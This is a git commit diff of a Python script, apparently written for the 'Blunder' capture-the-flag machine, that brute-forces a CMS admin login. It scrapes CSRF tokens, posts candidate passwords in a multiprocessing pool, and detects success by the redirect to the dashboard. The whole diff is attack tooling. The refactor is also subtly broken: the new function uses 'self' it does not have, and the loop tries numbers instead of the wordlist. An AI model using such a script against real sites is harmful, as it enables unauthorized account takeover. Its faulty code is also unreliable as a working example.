3d62587801328d371ba80405e7277ab9e97596a3
Gerald <me@jacobford.co.uk>
2020-06-25 17:14:13 +0100

    feat(bruteforce): updated

--- bruteforce.py
+++ bruteforce.py
@@ -4,10 +4,26 @@ import requests
 from multiprocessing import Pool
 
 def request_csrf_token(session, url):
-    page = session.get(url)
+    page = session.get(url, timeout=3)
+    page.raise_for_status()
     match = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', page.text)
-    if match:
-        return match.group(1)
+    return match.group(1) if match else None
+
+def attempt_login(password, session, url):
+    try:
+        login_url = "%s/admin/login" % url 
+        token = request_csrf_token(session, login_url)
+        headers = {}
+        data = {
+         'tokenCSRF': token,
+         'username': self.username,
+         'password': password,
+         'save': ''
+        }
+        resp = self.session.post(login_url, headers=headers, data=data, allow_redirects=False)
+        return (resp, password), None
+    except:
+        return None, "Login attempt failed" 
 
 class Blunder:
     def __init__(self, url, username):
@@ -22,29 +38,22 @@ class Blunder:
         reg = re.compile(r'\w+')
         return list({word for word in reg.findall(content)})
     
-    def attempt_login(self, password):
-        login_url = "%s/admin/login" % self.url 
-        token = request_csrf_token(self.session, login_url)
-        headers = {}
-        data = {
-            'tokenCSRF': token,
-            'username': self.username,
-            'password': password,
-            'save': ''
-        }
-        resp = self.session.post(login_url, headers=headers, data=data, allow_redirects=False)
-        return resp, password
 
     def run(self):
-        pool = Pool(100)
-        def callback(resp, password):
-            if 'location' in resp.headers:
-                if '/admin/dashboard' in resp.headers['location']:
-                    print('SUCCESS: Password found!')
-                    pool.terminate()
-                    return password
-        for word in self.words:
-            pool.apply_async(self.attempt_login, args=[word], callback=callback)
+        print("[+] Starting pool")
+        pool = Pool(10)
+
+        def callback(a):
+            ret, err = a 
+            if err != None:
+                print("[+] Terminated: %s" % err)
+                return pool.terminate()
+            if 'location' in ret[0].headers and '/admin/dashboard' in ret[0].headers['location']:
+                print('[+] Success: Password is %s', ret[1])
+                pool.terminate()
+
+        for password in range(10):
+            pool.apply_async(attempt_login, args=[password, self.session, self.url], callback=callback)
 
         pool.close()
         pool.join()
